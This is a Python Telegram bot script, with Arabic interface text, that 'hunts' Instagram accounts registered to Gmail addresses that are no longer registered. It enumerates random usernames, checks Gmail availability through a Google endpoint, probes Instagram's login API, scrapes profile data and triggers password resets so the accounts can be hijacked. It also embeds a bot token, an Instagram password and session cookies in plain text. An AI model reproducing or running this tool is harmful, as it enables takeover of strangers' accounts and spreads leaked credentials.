import webbrowser
import requests,time,pyfiglet,datetime
linux = 'clear'
windows = 'cls'
#print('\033[1;32mقم بادخال التوكن الخاص بك ')
tok = ('6385664119:AAFbKVa8LbudCRy1mzq-hK7zGSHIPaPtXho')
print('')
#print('\033[1;32mقم بادخال يوزر الحساب الانستا الخاص بك')
username = ('n.n.a.a.d.d.e.e')
#print('')
#print('\033[1;32mقم بادخال باسوورد حسابك الانستا الخاص بك')
password = ('1350971290')
try:
	import requests 
	import telebot 
	from telebot import types
	import requests
	from uuid import uuid4
	from gdolib import *
	import gdolib
	import random
	from Nova_Tools import Tools
	from TrackCobra import Valid
	from gdolib import *
	import names
	import os
	import json
	import sys
	uid = uuid4()
except:
	print(' يتم تثبيت المكاتب المطلوبه ارجو الانتضار')
	os.system("pip install requsets")
	os.system("pip install names")
	os.system("pip install telebot")
	os.system("pip install Pytelegrambotapi")
	os.system("pip install Pytelegrambotapi==4")
	os.system("pip install uid")
	os.system("pip install json")
	os.system("pip install mechanize")
	os.system("pip install gdolib")
	os.system("pip install TrackCobra")
	os.system("pip install Nova_Tools")
	os.system("pip install uuid")
	os.system("clear")

import requests,random,mechanize,time
import requests,random,mechanize,datetime
os.system('clear')

B = '\033[2;36m'
A = "\033[1;91m"
H = "\033[1;93m"
C = "\033[1;97m" 
print(B+'━'*29)

os.system([linux, windows][os.name == 'nt'])
url = 'https://www.instagram.com/accounts/login/ajax/'
data = {'username': f'{username}',
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
        'queryParams': '{}',
        'optIntoOneTap': 'false'}            
headers = {'accept': '*/*',
    'accept-encoding': 'gzip, deflate, br',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-length': '275',
    'content-type': 'application/x-www-form-urlencoded',
    'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
    'origin': 'https://www.instagram.com',
    'referer': 'https://www.instagram.com/',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
    'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
    'x-ig-app-id': '936619743392459',
    'x-ig-www-claim': '0',
    'x-instagram-ajax': 'bc3d5af829ea',
    'x-requested-with': 'XMLHttpRequest'}		
k = requests.post(url,headers=headers,data=data)
if 'authenticated":true' in k.text or 'userId' in k.text:
	print(" login True")
	print("="*60)
	os.system([linux, windows][os.name == 'nt'])
	sessionid = k.cookies['sessionid']

head={'Cookie':'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid='+sessionid}

print(B+'━'*29)
os.system('clear')
bot = telebot.TeleBot(tok)
srt = types.InlineKeyboardButton(text ="بدا الصيد",callback_data = 'hun')
me = types.InlineKeyboardButton(text ="المطور",url="https://t.me/nader20090")
@bot.message_handler(commands=["start"])
def start(message):
    fr = message.from_user.first_name
    maac = types.InlineKeyboardMarkup()
    maac.row_width = 1
    maac.add(srt,me)
    bot.send_message(message.chat.id,f"""𖤍 اهلا وسهلا يا {fr} 𖤍\n𖤍 المطور نادر 𖤍\n𖤍 بوت صيد متاحات انستا 𖤍\n𖤍 التخمين دومين 𖤍\n𖤍 @gmail.com 𖤍\n𖤍 انتضر رزقك 𖤍\n𖤍 لتشغيل البوت اضغط على بدا الصيد 𖤍\n𖤍 لمراسلت المطور اضغط على المطور 𖤍\n𖤍 لا تنسه الصلاه على النبي 𖤍""",parse_mode="html",reply_markup=maac)
@bot.callback_query_handler(func=lambda call: True)
def qwere(call):
    if call.data == "hun":
        li(call.message)
def li(message):
 aol1=0
 face1=0
 face2=0
 aol2=0
 while True:
  user='1234567890qwertyuiopasdfghjklzxcvbnm.'
  num='56789'
  rng=int("".join(random.choice(num)for i in range(1)))
  name=str("".join(random.choice(user)for i in range(rng)))
  whisper=requests.get(f'https://www.instagram.com/web/search/topsearch/?context=blended&query={name}',headers=head).json()
  mn=0
  try:
   while True:
        mn += 1
        user=str(whisper['users'][mn]['user']['username'])
        emai=user
        email=emai+'@gmail.com'
        url = 'https://android.clients.google.com/setup/checkavail'
        h = {
		'Content-Length':'98',
		'Content-Type':'text/plain; charset=UTF-8',
		'Host':'android.clients.google.com',
		'Connection':'Keep-Alive',
		'user-agent':'GoogleLoginService/1.3(m0 JSS15J)',
		}
        d = json.dumps({
		'username':email,
		'version':'3',
		'firstName':'AbaLahb',
		'lastName':'AbuJahl'
	})
        res = requests.post(url,data=d,headers=h)
        if res.json()['status'] == 'SUCCESS':
            aol1+=1
            url =  'https://i.instagram.com/api/v1/accounts/login/'
            headers = { 'Accept': '*/*',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'en-US',
'X-IG-Capabilities': '3brTvw==',
'X-IG-Connection-Type': 'WIFI',
'Host': 'i.instagram.com',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'User-Agent':'Instagram 114.0.0.0.41 Android (30/3.0; 240dpi; 1242x2688; huawei/google; samsung; angler; angler; en_US)',
'Cookie': 'missing' }
            data = {'uuid':uid,  'password':'@zaid11121',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
            req= requests.post(url, headers=headers, data=data).json()
            if req['message'] == 'The password you entered is incorrect. Please try again.':
                face1+=1
                email=user.split('@')[0]
                email=email+'@gmail.com'
                rr=requests.get(f'https://www.instagram.com/{user}/?__a=1&__d=dis',headers=head).json()  
                nam = str(rr['graphql']['user']['full_name'])
                iddd = str(rr['graphql']['user']['id'])
                fol = str(rr['graphql']['user']['edge_followed_by']['count'])
                fols =str(rr['graphql']['user']['edge_follow']['count'])
                isp = str(rr['graphql']['user']['is_private'])
                bio = str(rr['graphql']['user']['edge_owner_to_timeline_media']['count'])
                re = requests.get(f"https://o7aa.pythonanywhere.com/?id={iddd}")   
                ree = re.json()
                dat = ree['date']
                res = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=headers, data=data).json()
                rs =str(res['obfuscated_email'])
                zaid =(f"""
حقوق NADER
𒋨────━𓆩NADER𓆪‏━────𒋨
❖ - 𝖓𝖆𝖒𝖊 : {nam}
❖ - 𝖚𝖘𝖊𝖗𝖓𝖆𝖒𝖊 : @{user}
❖️ - 𝖊𝖒𝖆𝖎𝖑 : {email}
❖️ -𝖗𝖘 : {rs}
❖️ - 𝖋𝖔𝖑𝖑𝖔𝖜𝖊𝖗𝖘 : {fols}
❖ - 𝖋𝖔𝖑𝖑𝖔𝖎𝖓𝖌 :{fol}
❖ - 𝖉𝖆𝖙𝖆 𝖆𝖈𝖈𝖔𝖚𝖓𝖙 : {dat}
𒋨────━𓆩NADER𓆪‏━─────𒋨
❖ - ᗷY : @nader20090 - @N_2_N_1  """)
                bot.send_message(message.chat.id,zaid)
            else:
                face2+=1
        else:
            aol2+=1
            mees = types.InlineKeyboardMarkup(row_width=1)
            ba0=types.InlineKeyboardButton(f"𓆩NADER𓆪‏",callback_data='b0')
            ba1=types.InlineKeyboardButton(f"Email : {email}",callback_data='b1')
            ba2=types.InlineKeyboardButton(f"God Instagram : {face1}",callback_data='b2')
            ba3=types.InlineKeyboardButton(f"God Gmail : {aol1}",callback_data='b3')
            ba5=types.InlineKeyboardButton(f"BaD gmail : {aol2}",callback_data='b5')
            ba6=types.InlineKeyboardButton(f"Bad Instagram : {face2}",callback_data='b6')
            ba7=types.InlineKeyboardButton(f"https://t.me/nader20090",callback_data='b7')
            mees.add(ba1,ba2,ba3,ba5,ba6,ba7,ba0)
            bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="جاري صيد ..",parse_mode='markdown',reply_markup=mees)
  except IndexError:
  	os.system
bot.polling()
g()
